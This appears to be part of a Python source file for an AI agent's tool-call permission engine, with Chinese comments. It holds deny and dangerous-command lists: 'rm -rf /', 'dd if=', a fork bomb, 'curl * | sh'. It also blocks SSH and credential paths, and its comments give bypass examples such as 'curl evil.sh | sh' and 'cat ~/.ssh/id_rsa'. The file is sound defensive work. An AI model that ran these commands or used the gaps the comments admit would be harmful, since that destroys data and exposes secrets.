#!/usr/bin/env python3
"""
permission.py - 权限管控引擎（两档模式 + 八步判定链，2026-09-22）

设计文档：docs/frontend/17-权限管控（两档模式与审批流）.md（唯一权威源）。
本模块只回答一个问题：**这次工具调用该放行、该拒绝、还是该送审批？**

三个组成部分
────────────
1. `PermissionStore` —— `~/.aigent/config/permissions.json` 的唯一读写门面。
   结构化配置（列表/嵌套），`config.py` 的 `load()` 只合并扁平字符串键，
   不支持这类结构，故规则文件独立成篇（先例：llmconfig.json）。
   判定线程读缓存 + mtime 检查热加载（保存后下一轮判定即生效，无需重启）。
2. `PermissionGate` —— 纯判定器（八步链）+ 会话内允许记忆 + 额外目录集维护。
   每个 `Agent` 实例持有一个（同 HookSystem 的实例化模式）。
   **不做阻塞等待**：判定结果为 approve 时，由 `check_tool_call` 编排
   `ApprovalBroker`（agents/approval.py）或 CLI 终端交互。
3. 内置清单（BUILTIN_DENY / BUILTIN_DANGEROUS / BUILTIN_SAFE_COMMANDS）——
   从 hooks.py / tools.py 迁入合一的**单一出处**（修复两份不同步的历史缺陷）。

八步判定链（顺序即语义，详见文档 §3.2）
──────────────────────────────────────
① 解析失败        → deny（fail-closed，宁拒不放）
② 硬拒绝          内置 + permissions.json deny_patterns + rules[action=deny]
                  + 敏感路径 DENY_PATHS（文件工具目标 / bash 裸路径 token）
                  → deny。**任何模式（含完全访问）、任何记忆都不可越过**
③ 完全访问        mode == full_access → allow（mcp_destructive=ask 的例外除外）
④ 预授权目录      文件工具目标在额外目录集（全局额外目录 ∪ 会话批准）内 → allow
⑤ 自定义允许规则  **已于 2026-09-22 下线**，判定链不再走此步：存量 `rules` 按
                  action 迁移进 ②`deny_patterns` / ⑦b`dangerous_patterns` /
                  ⑦a`safe_commands`（迁移表见 `_normalize`）。编号保留不重排，
                  以便与既有文档、记录对照。
⑥ 会话内允许      session_allows 匹配（bash_prefix / pattern / path / mcp_tool）
⑦ 类别规则        **先危险模式（approve）→ 再安全白名单（allow）**；区内读写
                  → allow；目录外 / 其他 bash / MCP destructive → approve
⑧ 审批            **有交互通道**（broker 已注入 / CLI）→ 阻塞等用户三选一；
                  **无通道**（cron / 纯后台，且 silent）→ 自动拒绝（确定性结局）

⑦ 内两步的**次序即安全语义**（2026-09-22 修正，勿回退）
──────────────────────────────────────────────────────
危险模式必须先于白名单判定。两个理由缺一不可：
  a) 安全：白名单命中即 `continue` 会跳过本段剩余检查 —— `cat x > /etc/passwd`
     这类「白名单只读命令 + 重定向」曾因此被**静默放行**；而同类的
     `echo x > /dev/sda` 因 `> /dev/sd` 在硬拒绝清单里反被拦住，明显不自洽。
  b) 能力：次序一致后，「白名单写大类 + 危险清单写特例」即可表达
     「大类放行 + 特例除外」（白名单 `git ` + 危险 `git push`）。
     用户只需记住：**越严的越先判，冲突时更严的一方赢**。

线程模型
──────
`check_tool_call` 由 PreToolUse 触发（turn 工作线程，与 ask_user 的阻塞
handler 同一线程模型）。session_allows 的读写持小锁（记录来自审批线程视角、
读取来自 gate 判定，可能并发）。
"""

from __future__ import annotations

import json
import os
import shlex
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from config import AIGENT_HOME, CONFIG_DIR
from logger import get_logger
from paths import WORKTREE_DIR

log = get_logger("permission")

# ═══════════════════════════════════════════════════════════════════════════
#  常量：模式 / 结算态 / 触发类型
# ═══════════════════════════════════════════════════════════════════════════

MODE_DEFAULT = "default"
MODE_FULL_ACCESS = "full_access"
VALID_MODES = (MODE_DEFAULT, MODE_FULL_ACCESS)

# 审批结算（approval_resolved.status / Decision.approve 的返回）
APPROVE_ALLOW_ONCE = "allow_once"
APPROVE_ALLOW_SESSION = "allow_session"
APPROVE_DENY = "deny"
VALID_DECISIONS = (APPROVE_ALLOW_ONCE, APPROVE_ALLOW_SESSION, APPROVE_DENY)

# 审批超时范围（秒）：permissions.json 可配，越界钳回默认
DEFAULT_TIMEOUT_SECONDS = 300
MIN_TIMEOUT_SECONDS = 60
MAX_TIMEOUT_SECONDS = 3600

# ═══════════════════════════════════════════════════════════════════════════
#  内置清单（迁自 hooks.py DEFAULT_DENY_LIST / DEFAULT_DESTRUCTIVE 与
#  tools.py run_bash 的重复黑名单 —— 修复两份不同步，本处为唯一出处）
# ═══════════════════════════════════════════════════════════════════════════

# 硬拒绝：任何模式不可放行（设置页只读展示 + 允许追加，不可删）。
#   "sudo"     → 首 token 为 sudo 的段（不再误杀 echo "sudo"，token 边界匹配）
#   "dd if="  → 子串匹配（含 "=" 的操作符模式，见 pattern_matches 注释）
#   "> /dev/sd" → 子串匹配（重定向操作符）
BUILTIN_DENY = [
    "rm -rf /", "rm -rf ~", "sudo", "shutdown", "reboot",
    "mkfs", "dd if=", "> /dev/sd", "chmod -R 777 /",
]

# 危险模式：默认模式审批；完全访问放行；设置页可增删。
#   "rm "      → 首 token 为 rm 的段（注意末尾空格 = token 边界）
#   "curl * | sh" → 跨段模式：curl/wget 段后紧跟 sh/bash 段
BUILTIN_DANGEROUS = [
    "rm ", "> /etc/", "chmod 777", "curl * | sh", "curl * | bash",
    "wget * | sh", "kill ", "pkill ", "> /dev/", ":(){ :|:& };:",
]

# 只读安全白名单：默认模式自动放行（设置页可增删/整体关闭）。
BUILTIN_SAFE_COMMANDS = [
    "ls", "pwd", "cat", "head", "tail", "wc", "grep", "rg", "find",
    "which", "file", "stat", "du", "df", "echo", "date", "env",
    "git status", "git diff", "git log", "git show", "git branch",
    "python --version", "python3 --version", "node --version", "npm ls",
]

# 文件工具集合（路径判定的对象；run_glob 是纯搜索、不读内容，不在此列）
FILE_TOOLS = {"run_read", "run_write", "run_edit"}

# ═══════════════════════════════════════════════════════════════════════════
#  敏感路径黑名单（优先级②，任何模式拒绝，额外目录也不能豁免）
# ═══════════════════════════════════════════════════════════════════════════

# 按文件名拦截（任意目录下）：防止审批/额外目录被用来合法地读出密钥
_DENY_FILE_SUFFIXES = (".pem", ".key")
_DENY_FILE_NAMES = {".env"}

# 按前缀拦截的绝对路径（惰性求值：Path.home() 在测试里可能被 monkeypatch）
def _deny_path_roots() -> list[Path]:
    home = Path.home()
    return [
        home / ".ssh",
        # 配置文件目录（2026-09-22 起配置文件统一收在 ~/.aigent/config/）：
        # 只拦其中含凭证/规则的三份 —— config.json（纯参数）与 providers.json
        # （公共厂商元数据）不含密钥，维持既有「不拦」语义。
        CONFIG_DIR / "credentials.json",
        CONFIG_DIR / "llmconfig.json",
        CONFIG_DIR / "permissions.json",
        # 迁移前的顶层旧路径：一并拦截。迁移是 rename，正常情况下旧文件已不存在；
        # 但若搬迁失败（跨设备/权限）或用户手工同步回一份副本，这里的兜底能避免
        # 「新路径已生效、旧文件却成了可读取后门」的安全退化。
        AIGENT_HOME / "credentials.json",
        AIGENT_HOME / "llmconfig.json",
        AIGENT_HOME / "permissions.json",
        # 注：`AIGENT_HOME / "logs"` 已于 2026-09-22 移出硬拒绝 —— 日志不含密钥，
        # 而"读自己的日志排障"是 agent 的刚需（此前 run_read 读 agent_日期.log 会被
        # deny，排查"前端状态断了"反而无路可走）。写入不受影响：logs 不在工作空间内，
        # run_write/run_edit 走 ⑦ 的 outside_workspace 审批，不是静默放行。
    ]


def deny_path_hit(target: Path) -> str | None:
    """敏感路径命中 → 返回命中的路径描述（展示用）；未命中返回 None。

    判定规则：文件名后缀（*.pem/*.key）/ 文件名（.env）/ 位于敏感目录根下。
    deny 恒赢：它出现在判定链第②步，先于一切放行条件。
    """
    name = target.name.lower()
    if name in _DENY_FILE_NAMES:
        return str(target)
    if name.endswith(_DENY_FILE_SUFFIXES):
        return str(target)
    for root in _deny_path_roots():
        try:
            if target == root or root in target.parents:
                return str(root)
        except (OSError, TypeError):
            continue
    return None


def _tilde(path: Path) -> str:
    """home 下的路径显示成 `~/...`（设置页展示用；非 home 路径原样返回）。"""
    try:
        return "~/" + str(Path(path).relative_to(Path.home()))
    except (ValueError, TypeError):
        return str(path)


def builtin_snapshot() -> dict:
    """内置清单快照（设置页**只读**展示用）—— 与常量同文件，改常量自动跟随。

    为什么必须由后端下发：八分区里 ⑤⑥ 的表单形态是「内置只读 chip + 自定义追加」。
    前端若自己写一份内置清单常量，就制造了**第二出处** —— 以后改 `BUILTIN_DANGEROUS`
    必然漏改前端，正是 17 篇 §1.1 记录的「hooks.py 与 tools.py 两份黑名单不同步」
    缺陷模式重演。

    `deny_paths` 由 `CONFIG_DIR` / `Path.home()` 派生（不手写字面量），与前缀拦截的
    真实来源同源。迁移前的顶层旧路径（`~/.aigent/credentials.json` 等三份）仍在拦，
    但**不下发** —— 那是过渡期兜底，不是用户需要理解的配置面。
    """
    return {
        "safe_commands": list(BUILTIN_SAFE_COMMANDS),
        "dangerous": list(BUILTIN_DANGEROUS),
        "deny": list(BUILTIN_DENY),
        "deny_paths": [
            "*.pem / *.key（任意目录）",
            ".env（任意目录）",
            f"{_tilde(Path.home() / '.ssh')}/（整个目录）",
            _tilde(CONFIG_DIR / "credentials.json"),
            _tilde(CONFIG_DIR / "llmconfig.json"),
            _tilde(CONFIG_DIR / "permissions.json"),
        ],
        "timeout": {
            "default": DEFAULT_TIMEOUT_SECONDS,
            "min": MIN_TIMEOUT_SECONDS,
            "max": MAX_TIMEOUT_SECONDS,
        },
        # 判定次序（设置页「判定顺序」区块直接渲染，前端零硬编码）：
        # 与 `evaluate` / `_bash_category_decision` 的**实现次序同源** ——
        # 改判定链时必须同步改这里，否则界面会描述一个不存在的顺序。
        "order": [
            {
                "key": "deny",
                "label": "硬拒绝",
                "effect": "直接拒绝",
                "rank": "最先判定 · 不可越过",
                "note": "命中即拒绝，完全访问模式也照样拦下；任何会话记忆、额外目录都不能豁免。",
            },
            {
                "key": "dangerous",
                "label": "危险命令",
                "effect": "一律先送审批",
                "rank": "其次判定 · 先于白名单",
                "note": "因为先于白名单判定，它天然可以当白名单的例外：白名单写 git（大类放行），这里写 git push（特例仍要过问）。",
            },
            {
                "key": "safe",
                "label": "安全命令白名单",
                "effect": "直接放行",
                "rank": "再次判定 · 逐段生效",
                "note": "逐段判定：复合命令里只有命中白名单的片段被放行，其余片段仍按「未列出」处理。",
            },
            {
                "key": "other",
                "label": "未列出的命令",
                "effect": "同样需要审批",
                "rank": "最后兜底",
                "note": "不在白名单内就需要过问；想彻底免问就把它加进白名单。",
            },
        ],
    }


# ═══════════════════════════════════════════════════════════════════════════
#  bash 命令解析：分段 / 归一化 / token 化 / cmd_head / 模式匹配
# ═══════════════════════════════════════════════════════════════════════════

def _strip_comment(command: str) -> str:
    """去掉行尾注释（引号内的 # 不算注释）。"""
    quote = ""
    for i, ch in enumerate(command):
        if quote:
            if ch == quote:
                quote = ""
            continue
        if ch in "\"'":
            quote = ch
            continue
        if ch == "#" and (i == 0 or command[i - 1] in " \t"):
            return command[:i]
    return command


def split_command_segments(command: str) -> list[str]:
    """按引号外的 `;` `&&` `||` `|` `换行` 切成子命令段（引号内的分隔符不算）。

    每段独立过判定链：堵住 `ls && rm -rf /` 里「安全段掩护危险段」的绕过。
    分隔符本身被丢弃（&&/||/| 对判定语义无差别：每个部分都要过）。
    """
    segments: list[str] = []
    buf: list[str] = []
    quote = ""
    for ch in _strip_comment(str(command or "")):
        if quote:
            buf.append(ch)
            if ch == quote:
                quote = ""
            continue
        if ch in "\"'":
            quote = ch
            buf.append(ch)
            continue
        if ch in ";\n":
            segments.append("".join(buf))
            buf = []
            continue
        if ch in "|&":
            if buf:
                segments.append("".join(buf))
                buf = []
            continue
        buf.append(ch)
    if buf:
        segments.append("".join(buf))
    return [s for s in (seg.strip() for seg in segments) if s]


def normalize_segment(segment: str) -> str:
    """归一化：压缩连续空白（堵 `rm  -rf /` 双空格绕过）。"""
    return " ".join(str(segment or "").split())


def tokenize(segment: str) -> list[str]:
    """token 化（引号感知；引号不闭合时退回普通空白切分，宁松不炸）。"""
    try:
        return shlex.split(normalize_segment(segment))
    except ValueError:
        return normalize_segment(segment).split()


def cmd_head(segment: str) -> str:
    """段的命令头（`bash_not_allowed` 的会话记忆粒度，文档 §3.4）。

    规则：第一个 token 恒取；若它不含路径字符（/ 或 .）且第二个 token 是
    纯字母数字（无 - / . = 等特殊字符）则拼上：
        git push origin main → "git push"     npm install -D x → "npm install"
        ./run.sh build       → "./run.sh"     python3 -c ...    → "python3"
    """
    tokens = tokenize(segment)
    if not tokens:
        return ""
    head = tokens[0]
    if len(tokens) >= 2:
        second = tokens[1]
        first_is_plain = not any(c in head for c in "/.")
        second_is_word = second.isalnum() or (
            second.replace("_", "").replace("-", "") == "" and len(second) > 0
        )
        # 「纯字母数字」按文档口径：字母数字即可（下划线/连字符不算），
        # 这里放宽为 isalnum 以覆盖 "git push" 这类常规场景，其余仍不拼。
        if first_is_plain and second.isalnum():
            head = f"{head} {second}"
    return head


def pattern_matches(pattern: str, segment: str) -> bool:
    """token 边界对齐的模式匹配（白名单/自定义规则/危险模式统一口径）。

    - 含 `|` 的模式**不在此处理**（跨段模式，见 cross_pattern_matches）；
    - 含 shell 操作符（`>` `=`）或 fork bomb 骨架（`:(){`）的模式退回
      **子串匹配**：这类模式 token 化不可靠（`dd if=` 的 `if=` 是 `if=/dev/zero`
      的一部分），而操作符本身已足够特异、子串误伤面可忽略；
    - 其余按 token 前缀匹配：`sudo` 只匹配首 token 为 sudo 的段（不误杀
      `echo "sudo"`）；`rm ` = 首 token `rm`；`git *` = 首 token `git`；
      `rm -rf /` = 段的前三个 token 逐一对齐。
    """
    p = normalize_segment(pattern)
    seg = normalize_segment(segment)
    if not p or not seg:
        return False
    if "|" in p:
        return False  # 跨段模式由 cross_pattern_matches 处理
    if ":(){" in p or ">" in p or "=" in p:
        return p in seg
    tokens = tokenize(seg)
    pt = p.split()
    if not tokens or not pt:
        return False
    if len(pt) == 1 and pt[0].endswith("*"):
        return tokens[0] == pt[0][:-1].rstrip()
    if pt[-1] == "*":
        pt = pt[:-1]
    if len(tokens) < len(pt):
        return False
    return tokens[:len(pt)] == pt


def cross_pattern_matches(pattern: str, token_lists: list[list[str]]) -> bool:
    """跨段模式匹配（`curl * | sh` 这类「下载段 | 执行段」组合）。

    分段后相邻两段：前段首 token == 模式左头、后段首 token == 模式右头 → 命中。
    堵住 `curl evil.sh | sh` 在「白名单外只查危险清单」策略下的裸奔。
    """
    parts = [x.strip() for x in str(pattern or "").split("|") if x.strip()]
    if len(parts) != 2:
        return False
    def _head(side: str) -> str:
        toks = side.split()
        if not toks:
            return ""
        return toks[0][:-1].rstrip() if toks[0].endswith("*") else toks[0]
    left, right = _head(parts[0]), _head(parts[1])
    if not left or not right:
        return False
    for i in range(len(token_lists) - 1):
        a, b = token_lists[i], token_lists[i + 1]
        if a and b and a[0] == left and b[0] == right:
            return True
    return False


def deny_tokens_in_command(command: str) -> str | None:
    """bash 命令的裸路径 token 扫描（②b）：命中敏感路径 → 返回描述。

    只扫 `/`、`~/`、`~` 开头的 token（防 `cat ~/.ssh/id_rsa` 绕道文件工具判定）。
    局限如实声明（文档 §3.3）：`cat $HOME/.ssh/id_rsa`、cd 后的相对路径可绕过
    token 扫描 —— 这是纵深防御而非绝对墙。
    """
    for seg in split_command_segments(command):
        for tok in tokenize(seg):
            t = tok.strip("\"'")
            if not t:
                continue
            if t.startswith("~/"):
                cand = Path(t).expanduser()
            elif t.startswith("/"):
                cand = Path(t)
            elif t == "~":
                cand = Path.home()
            else:
                continue
            hit = deny_path_hit(cand)
            if hit:
                return hit
    return None


# ═══════════════════════════════════════════════════════════════════════════
#  Decision：判定结果（数据类）
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class Decision:
    """判定结果。approve 时 trigger / session_key 必填。"""
    action: str                    # "allow" | "deny" | "approve"
    reason: str = ""               # 展示原因 / 回填模型的拒绝文案
    trigger: str = ""              # dangerous_pattern | bash_not_allowed |
                                   # outside_workspace | mcp_destructive
                                   # （历史值 `custom_rule` 已随自定义规则下线，
                                   #   仅旧会话/审批记录里可能残留）
    session_key: dict | None = field(default=None)   # 「会话内允许」记账粒度
    segment: str = ""              # 触发段（卡片高亮用）


def _allow() -> Decision:
    return Decision("allow")


def _deny(reason: str) -> Decision:
    return Decision("deny", reason=reason)


def _approve(trigger: str, reason: str, session_key: dict, segment: str = "") -> Decision:
    return Decision("approve", reason=reason, trigger=trigger,
                   session_key=session_key, segment=segment)


# ═══════════════════════════════════════════════════════════════════════════
#  PermissionStore：~/.aigent/config/permissions.json 的唯一读写门面
# ═══════════════════════════════════════════════════════════════════════════

def _is_absolute_dir(value: str) -> bool:
    """额外目录必须是绝对路径（`~` 展开后判定）。

    相对路径会以**后端进程的 cwd** 为基准被 `Path(d).resolve()` 解析出意外目录
    （设置页方案 §2.4-1）—— 宁可丢弃并提示，也不要静默放行一个用户没指定的目录。
    路径**不存在不拦**（用户可能先配后建目录），只在这里判形态。
    """
    try:
        return Path(value).expanduser().is_absolute()
    except (OSError, ValueError, RuntimeError):
        return False


def _dedup_preserve_order(items) -> list[str]:
    """保序去重（空串由调用方先行过滤）—— 避免同一目录/模式在设置页出现两遍。"""
    seen: set[str] = set()
    out: list[str] = []
    for x in items:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


def _normalize_warnings(raw, normalized: dict) -> list[str]:
    """对比「用户提交的原值」与「归一化权威值」，产出设置页要展示的人话说明。

    两类内容（都不阻断保存）：
    - **被修正**：超时钳位、非法模式回落、非绝对路径目录被丢、重复项去重、白名单空回落。
    - **提示无效**：追加项已在内置清单中、额外目录命中敏感路径。

    为什么必须在后端生成：归一化是后端的职责（单一出处）。前端自己算一套「什么会被改」
    就会与 `_normalize` 漂移，用户看到的解释与实际落盘不一致 —— 比不解释更糟。
    """
    if not isinstance(raw, dict):
        return []
    warns: list[str] = []

    # ── 被修正 ──────────────────────────────────────────────────────
    mode = str(raw.get("default_mode") or "").strip()
    if mode and mode not in VALID_MODES:
        warns.append(f"权限模式「{mode}」无法识别，已回落为「{normalized['default_mode']}」")

    if "approval_timeout_seconds" in raw:
        try:
            given: int | None = int(raw.get("approval_timeout_seconds"))
        except (TypeError, ValueError):
            given = None
        final = normalized["approval_timeout_seconds"]
        if given is None:
            warns.append(f"审批超时不是整数，已回落为 {final} 秒")
        elif given != final:
            warns.append(
                f"审批超时 {given} 秒超出范围，已调整为 {final} 秒"
                f"（允许 {MIN_TIMEOUT_SECONDS}–{MAX_TIMEOUT_SECONDS}）"
            )

    mcp = str(raw.get("mcp_destructive") or "").strip().lower()
    if mcp and mcp not in ("ask", "allow"):
        warns.append(
            f"MCP 破坏性工具策略「{mcp}」无法识别，已回落为「{normalized['mcp_destructive']}」"
        )

    given_dirs = raw.get("additional_dirs")
    if isinstance(given_dirs, list):
        seen_dirs: set[str] = set()
        for d in given_dirs:
            if not isinstance(d, (str, int)):
                continue
            text = str(d).strip()
            if not text:
                continue
            if text in seen_dirs:
                warns.append(f"额外目录「{text}」重复，已去重")
                continue
            seen_dirs.add(text)
            if not _is_absolute_dir(text):
                warns.append(f"额外目录「{text}」不是绝对路径，已忽略")

    sc = raw.get("safe_commands")
    if isinstance(sc, dict):
        raw_list = sc.get("list")
        if isinstance(raw_list, list) and not any(str(x).strip() for x in raw_list):
            # 最容易误解的一条：删空 ≠ 关掉白名单（空列表会回落到内置全量）
            warns.append(
                "安全命令白名单为空，已回落到内置默认清单"
                "（若要关闭白名单，请用上方的开关）"
            )

    # 自定义规则已下线：只报告迁移结果。原先逐条提示「缺模式 / 动作无法识别」
    # 已删除 —— 该区从设置页移除后用户没有对应动作可做，迁移计数才是有效信息。
    rules = raw.get("rules")
    if isinstance(rules, list):
        moved = {"deny": 0, "ask": 0, "allow": 0}
        for r in rules:
            if not isinstance(r, dict):
                continue
            action = str(r.get("action") or "").strip()
            if str(r.get("pattern") or "").strip() and action in moved:
                moved[action] += 1
        total = sum(moved.values())
        if total:
            warns.append(
                f"自定义规则已下线，{total} 条规则已按动作迁入对应分区"
                f"（拒绝 {moved['deny']} 条 → 硬拒绝、"
                f"询问 {moved['ask']} 条 → 危险命令、"
                f"允许 {moved['allow']} 条 → 安全命令白名单）。"
                "注意「允许」类规则已由原先的「整条命令放行」收严为「逐段放行」，"
                "复合命令中的其他片段仍可能触发审批。"
            )

    # ── 提示无效（追加了也不会按预期生效）──────────────────────────
    builtin_deny_lower = {d.strip().lower() for d in BUILTIN_DENY}
    for item in normalized["deny_patterns"]:
        if item.strip().lower() in builtin_deny_lower:
            warns.append(f"「{item}」已在内置硬拒绝清单中，追加无效")
    builtin_dangerous_lower = {d.strip().lower() for d in BUILTIN_DANGEROUS}
    for item in normalized["dangerous_patterns"]:
        if item.strip().lower() in builtin_dangerous_lower:
            warns.append(f"「{item}」已在危险命令清单中，追加无效")
    for d in normalized["additional_dirs"]:
        try:
            hit = deny_path_hit(Path(d).expanduser())
        except (OSError, TypeError):
            hit = None
        if hit:
            warns.append(
                f"额外目录「{d}」与敏感路径黑名单冲突（{hit}），其内容仍会被硬拒绝"
            )
    return warns


def _default_config() -> dict:
    return {
        "version": 1,
        "default_mode": MODE_DEFAULT,
        "approval_timeout_seconds": DEFAULT_TIMEOUT_SECONDS,
        "mcp_destructive": "ask",
        "additional_dirs": [],
        "safe_commands": {"enabled": True, "list": list(BUILTIN_SAFE_COMMANDS)},
        "deny_patterns": [],
        "dangerous_patterns": [],
        "rules": [],
    }


class PermissionStore:
    """permissions.json 门面：损坏/缺失退回内置默认（fail-safe，不阻断启动）。

    - 读：mtime 检查热加载（判定线程读缓存；设置页保存后即刻生效）；
    - 写：原子写（tmp + os.replace）；读写各持锁，无并发撕裂（E11）；
    - 权限 0644（不含密钥）。
    """

    def __init__(self, path: Path | str | None = None):
        self.path = Path(path) if path else CONFIG_DIR / "permissions.json"
        self._lock = threading.Lock()
        self._cache: dict | None = None
        self._mtime: float | None = None

    # ── 读（判定路径，热加载）──────────────────────────────────────
    def load(self) -> dict:
        with self._lock:
            try:
                mtime = self.path.stat().st_mtime
            except OSError:
                mtime = None
            if self._cache is not None and mtime == self._mtime:
                return self._cache
            raw: object = None
            try:
                raw = json.loads(self.path.read_text(encoding="utf-8"))
            except FileNotFoundError:
                pass
            except (OSError, ValueError) as e:
                log.warning("permissions.json 无法解析，退回内置默认：%s", e)
            self._cache = self._normalize(raw)
            self._mtime = mtime
            return self._cache

    # ── 写（设置页保存路径）────────────────────────────────────────
    def save(self, data: dict) -> dict:
        """落盘并返回归一化后的权威值（等价于 `save_reporting(data)[0]`）。"""
        return self.save_reporting(data)[0]

    def save_reporting(self, data: dict) -> tuple[dict, list[str]]:
        """落盘并返回 `(归一化权威值, warnings)` —— 设置页保存路径。

        warnings 是**给人看的说明**（哪一项被钳位/被丢弃/追加了也不会生效），
        **不阻断保存**。与 `save()` 并存：后者退化为取首个元素，现有调用方与测试零改动。
        写盘失败时 `_write` 抛 `OSError`（调用方决定怎么回执），此时不返回。
        """
        normalized = self._normalize(data)
        warnings = _normalize_warnings(data, normalized)
        self._backup_legacy_rules(data)
        self._write(normalized)
        return normalized, warnings

    def _backup_legacy_rules(self, data) -> None:
        """迁移前把原始 `rules` 备份到 `<path>.rules-bak`（**仅首次，不覆盖**）。

        迁移是单向的（`allow` 由「整条命令放行」收严为「逐段放行」），留一份原始
        内容比事后靠猜便宜。只在备份文件不存在时写 —— 保留用户最初那份配置，
        而不是被后续保存反复改写。备份失败只告警，不影响迁移与保存。
        """
        if not isinstance(data, dict):
            return
        rules = data.get("rules")
        if not isinstance(rules, list) or not rules:
            return
        bak = self.path.with_name(self.path.name + ".rules-bak")
        if bak.exists():
            return
        try:
            bak.parent.mkdir(parents=True, exist_ok=True)
            bak.write_text(json.dumps(rules, ensure_ascii=False, indent=2) + "\n",
                           encoding="utf-8")
            log.info("自定义规则已下线，原始 rules 备份至 %s", bak)
        except OSError as e:
            log.warning("rules 备份写入失败（不影响迁移与保存）: %s", e)

    def _write(self, normalized: dict) -> None:
        """原子写（tmp + os.replace）+ 写后立刻失效缓存（下一轮判定即生效）。"""
        with self._lock:
            self.path.parent.mkdir(parents=True, exist_ok=True)
            tmp = self.path.with_name(
                f".{self.path.name}.{os.getpid()}.{threading.get_ident()}.tmp"
            )
            try:
                tmp.write_text(
                    json.dumps(normalized, ensure_ascii=False, indent=2) + "\n",
                    encoding="utf-8",
                )
                os.replace(tmp, self.path)
            except OSError as e:
                tmp.unlink(missing_ok=True)
                log.error("permissions.json 写入失败: %s", e)
                raise
            # 写后立刻失效缓存（下一轮判定即生效）
            self._cache = normalized
            try:
                self._mtime = self.path.stat().st_mtime
            except OSError:
                self._mtime = None

    # ── 归一化（读与写共用同一出口，脏数据全部收敛在这里）────────────
    @staticmethod
    def _normalize(raw) -> dict:
        if not isinstance(raw, dict):
            raw = {}
        out = _default_config()

        mode = str(raw.get("default_mode") or "").strip()
        out["default_mode"] = mode if mode in VALID_MODES else MODE_DEFAULT

        try:
            timeout = int(raw.get("approval_timeout_seconds") or DEFAULT_TIMEOUT_SECONDS)
        except (TypeError, ValueError):
            timeout = DEFAULT_TIMEOUT_SECONDS
        out["approval_timeout_seconds"] = min(max(timeout, MIN_TIMEOUT_SECONDS),
                                              MAX_TIMEOUT_SECONDS)

        # MCP 破坏性工具：ask（默认）/ allow。向后兼容旧环境变量开关
        # （MCP_ALLOW_DESTRUCTIVE=true → allow）——文件里显式给了值则以文件为准。
        mcp_raw = str(raw.get("mcp_destructive") or "").strip().lower()
        if mcp_raw in ("ask", "allow"):
            out["mcp_destructive"] = mcp_raw
        elif os.environ.get("MCP_ALLOW_DESTRUCTIVE", "").lower() == "true":
            out["mcp_destructive"] = "allow"

        # 额外目录：必须绝对路径（相对路径会按后端进程 cwd 解析出意外目录）+ 保序去重
        dirs = raw.get("additional_dirs")
        if isinstance(dirs, list):
            out["additional_dirs"] = _dedup_preserve_order([
                str(d).strip() for d in dirs
                if isinstance(d, (str, int)) and str(d).strip()
                and _is_absolute_dir(str(d).strip())
            ])

        sc = raw.get("safe_commands")
        if isinstance(sc, dict):
            custom_cmds = _dedup_preserve_order(
                str(x).strip() for x in (sc.get("list") or []) if str(x).strip()
            )
            out["safe_commands"] = {
                "enabled": bool(sc.get("enabled", True)),
                # 空列表回落内置全量：**"删空" ≠ "关掉白名单"**（关要用 enabled=false）。
                # 刻意的 fail-safe —— 白名单被误删空不该等于"所有命令都进审批"。
                "list": custom_cmds or list(BUILTIN_SAFE_COMMANDS),
            }

        for key in ("deny_patterns", "dangerous_patterns"):
            items = raw.get(key)
            if isinstance(items, list):
                out[key] = _dedup_preserve_order(
                    str(x).strip() for x in items
                    if isinstance(x, (str, int)) and str(x).strip()
                )

        # ── 自定义规则（原判定链第⑤步）已下线：存量 rules 迁移进三个分类列表 ──
        # 迁移表（等价性由测试锁定，勿凭感觉改）：
        #   deny  → deny_patterns        同落 ②，完全等价
        #   ask   → dangerous_patterns   同为送审批；迁移后**判定更早**（先于白名单）
        #   allow → safe_commands.list   **收严**：由「整条命令放行」变为「逐段放行」
        # 输出 `rules` 恒为空列表 → 写盘后再读已无可迁移项，天然幂等。
        rules = raw.get("rules")
        if isinstance(rules, list):
            for r in rules:
                if not isinstance(r, dict):
                    continue
                action = str(r.get("action") or "").strip()
                pattern = str(r.get("pattern") or "").strip()
                if not pattern:
                    continue
                if action == "deny":
                    out["deny_patterns"].append(pattern)
                elif action == "ask":
                    out["dangerous_patterns"].append(pattern)
                elif action == "allow":
                    out["safe_commands"]["list"].append(pattern)
            out["deny_patterns"] = _dedup_preserve_order(out["deny_patterns"])
            out["dangerous_patterns"] = _dedup_preserve_order(out["dangerous_patterns"])
            out["safe_commands"]["list"] = _dedup_preserve_order(
                out["safe_commands"]["list"])
        out["rules"] = []
        return out

    # ── 便捷访问器（判定路径用；load 缓存后的字典直读）──────────────
    @property
    def default_mode(self) -> str:
        return self.load()["default_mode"]

    @property
    def approval_timeout_seconds(self) -> int:
        return self.load()["approval_timeout_seconds"]


# ═══════════════════════════════════════════════════════════════════════════
#  PermissionGate：八步判定链 + 会话记忆 + 额外目录集
# ═══════════════════════════════════════════════════════════════════════════

class PermissionGate:
    """每个 Agent 实例持有一个。持有会话级状态（mode / session_allows /
    额外目录集），不做阻塞等待（审批编排见 check_tool_call）。

    额外目录集 `_extra_dirs`（set[Path]）是**共享对象**：启动时注入
    ToolRegistry（safe_path 的兜底放行集，防绕过 hook 的路径），gate
    审批「会话内允许」路径时动态追加 —— 同一个 set，零同步成本。
    """

    def __init__(self, workdir: Path | str, *, silent: bool = False,
                 store: PermissionStore | None = None):
        self.workdir = Path(workdir)
        # silent：**只表示"抑制终端打印"**，不是"无人值守"的判据（后者看 broker）。
        # 桌面端 Agent 亦为 silent=True，若拿它判无人值守会把审批卡片全部吞掉。
        self.silent = silent
        self.store = store if store is not None else PermissionStore()
        # 当前模式：内存态（gate 每次判定实时读，切换即时生效）。
        # init_session / switch_session 从会话 meta 恢复（继承链见 restore_from_meta）。
        self.mode: str = MODE_DEFAULT
        # 会话内允许记忆：[{type, value, at, source}]（持久化在会话 meta，
        # 重启会话后保留生效 —— 「会话内」以会话为界，不以进程为界）。
        self.session_allows: list[dict] = []
        # 额外目录集（共享给 ToolRegistry.safe_path）：worktree 沙箱（应用自管，
        # 恒放行）+ 全局额外目录（permissions.json）+ 会话批准目录（path 类记忆）。
        self._extra_dirs: set[Path] = {Path(WORKTREE_DIR).resolve()}
        # 审批 broker（会话级，由 SessionRuntime 注入；CLI / cron 不注入 →
        # 走 input() 终端交互或 silent 自动拒绝）
        self.approval_broker = None
        # 停止事件（Agent._stop_evt；broker 等待的兜底唤醒，同 ask_user）
        self._stop_event = None
        # session_allows 持久化回调（Agent 注入 → SessionManager.set_session_allows）
        self._save_allows_cb = None
